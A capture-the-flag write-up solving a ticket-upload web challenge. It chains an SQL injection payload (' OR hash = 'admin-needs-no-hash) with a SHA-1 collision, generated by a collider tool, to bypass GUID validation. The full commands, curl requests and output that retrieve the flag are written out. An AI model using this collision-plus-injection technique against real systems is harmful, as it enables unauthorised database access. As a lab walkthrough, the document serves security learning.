A web challenge without a URL? This is weird. So let's download the code attached and check what's inside.

The file README.md gives us a hint, how to use the code. The API allows us uploading and verifying a ticket. Tickets need to be in PDF format and contain a valid GUID in QR code. We also see that `Security: Yes` so this probably be a hard (maybe an impossible) task to break ;-)

Let's check where the flag is hidden which will give us some information of what we need to do in order to get it. The flag is hidden in the database as code of `'admin-needs-no-hash'` hash (`db.ExecuteAsync($"INSERT INTO Tickets (id, code, hash) VALUES (1, '{flag}', 'admin-needs-no-hash')");`).

So let's dive deeper into the code attached. There are two things that need to be noticed in the code. These are:
1. usage of SHA-1 (`sha1.ComputeHash(memoryStream);`),
2. SQL injection (`QueryFirstOrDefaultAsync($"SELECT * FROM Tickets WHERE code like '{code}'");`).

To use the SQL injection we need to include the exploit in the QR code. Maybe we could just use the QR code with some SQL injection string to obtain the flag? Unfortunately the API checks if we provide a valid GUID (`(!Guid.TryParse(code, out var result))`) and any SQL injection string definitely is not one. What hope do we have in this situation? We need to take a step back.

How it is verified if a previously uploaded ticket is in the database? We notice that the GUID itself is not checked, but a SHA-1 hash of the PDF file is calculated (`var existingHash = await db.QueryFirstOrDefaultAsync<string>($"SELECT * FROM Tickets WHERE hash like '{hash}'");`) and compared (`if (existingHash is null)`). After noticing the SHA-1 is used we visit a great set of all known hash collisions and exploitations: https://github.com/corkami/collisions (you should definitely bookmark this for upcoming CTFs). Let's check if there is anything interesting for us. 

We see there is a known collision attack on PDFs with SHA-1 called SHAttered (shattered.io). This attack will give the same SHA-1 hash for two PDF files with different content of our choice, using a pair of precomputed headers (prologues). As we need to use PDFs in the task the attack seems a perfect choice.

Diving deeper in the repository we find a tool to generate two different PDF files with the same SHA-1 hash: https://github.com/nneonneo/sha1collider Let's download the tool and use it. Open Kali Linux (or other Unix system of your choice) and download the Python script using the terminal:
> $ wget https://raw.githubusercontent.com/nneonneo/sha1collider/master/collide.py

Now let's generate one GUID using terminal or an online tool, e.g.: 
> c1e8c384-ab92-4f07-a08a-4e665ba46c3c

Input files for the collider script need to be in PDF format. We'll use the CyberChef tool (The Cyber Swiss Army Knife) to generate QR code with our content, and export it as PDF (if you don't know the tool already, you should definitely bookmark it for future uses https://gchq.github.io/CyberChef/).

As we want to inject a code into `SELECT * FROM Tickets WHERE code like '{code}'` query, our SQL injection will look as follows:
> ' OR hash = 'admin-needs-no-hash

If you don't know how to use the CyberChef, here are links for all already set as needed to generate QR codes with:
- GUID
https://gchq.github.io/CyberChef/#recipe=Generate_QR_Code('PDF',5,4,'Medium')&input=YzFlOGMzODQtYWI5Mi00ZjA3LWEwOGEtNGU2NjViYTQ2YzNj
- SQL injection
https://gchq.github.io/CyberChef/#recipe=Generate_QR_Code('PDF',5,4,'Medium')&input=JyBPUiBoYXNoID0gJ2FkbWluLW5lZWRzLW5vLWhhc2g

Save both files (as e.g. `download-guid.pdf` and `download-sqli.pdf`) in the same place as the script, and using it generate files with SHA-1 hash collision:

> $ python3 collide.py download-guid.pdf download-sqli.pdf

We can check that the files have different content and the same SHA-1 hash. To do this use the following commands in terminal:

> $ diff out-download-guid.pdf out-download-sqli.pdf  
> Binary files out-download-guid.pdf and out-download-sqli.pdf differ  
> $ sha1sum out-download-guid.pdf                
> ab55b82efe507589bc582a23661868edf92ba804  out-download-guid.pdf  
> $ sha1sum out-download-sqli.pdf              
> ab55b82efe507589bc582a23661868edf92ba804  out-download-sqli.pdf  
   
Now let's upload the file with GUID.

> $ curl -X POST -F "file=@./out-download-guid.pdf" https://ticket-api-061f5e195e3d.1753ctf.com/upload

We get an error and if we check the file locally we see that it's corrupted (note: it may not be in your case). What can we do about that? Reading the collider description once more we see an additional option:

> If the resulting PDFs don't work for you (e.g. they look corrupt, images have artifacts, etc.), try `--progressive` mode.

Let's generate the files again, this time using the additional option:

> $ python3 collide.py --progressive download-guid.pdf download-sqli.pdf

Now let's upload the file with GUID. This time the upload is succesfull.

Now let's verify the uploaded file:

> $ curl -X POST -F "file=@./out-download-guid.pdf" https://ticket-api-061f5e195e3d.1753ctf.com/verify  
> {"id":2,"code":"c1e8c384-ab92-4f07-a08a-4e665ba46c3c","hash":"1369cd0fe2fc0dfccfbc3a14b90f776dfa77bbab"}  

And the final step: let's verify the second file - the one with SHA-1 hash collision which contains the SQL injection:

> curl -X POST -F "file=@./out-download-sqli.pdf" https://ticket-api-061f5e195e3d.1753ctf.com/verify  
> {"id":1,"code":"1753c{dizz_are_not_forged_if_they_have_the_same_hasshhh}","hash":"admin-needs-no-hash"}   

Voilà! The flag is ours.
